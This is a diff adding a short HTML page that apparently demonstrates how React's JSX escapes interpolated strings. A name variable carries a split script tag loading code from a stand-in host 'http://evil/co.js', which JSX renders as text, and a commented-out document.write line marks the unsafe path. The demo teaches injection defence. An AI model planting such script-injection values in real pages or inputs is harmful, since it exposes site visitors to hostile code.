@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>JSX HTML entities</title>
+    <meta charset="utf-8">
+  </head>
+  <body>
+    <div id="app">
+      <!-- my app renders here -->
+    </div>
+    <script src="react/build/react.js"></script>
+    <script src="react/build/react-dom.js"></script>
+    <script src="babel/browser.js"></script>
+    <script type="text/babel">
+      
+      var firstname = 'John<scr'+'ipt src="http://evil/co.js"></scr'+'ipt>';
+      
+      ReactDOM.render(
+        <h2>
+          Hello {firstname}!
+        </h2>,
+        document.getElementById('app')
+      );
+      // document.write(firstname);
+    </script>
+  </body>
+</html>
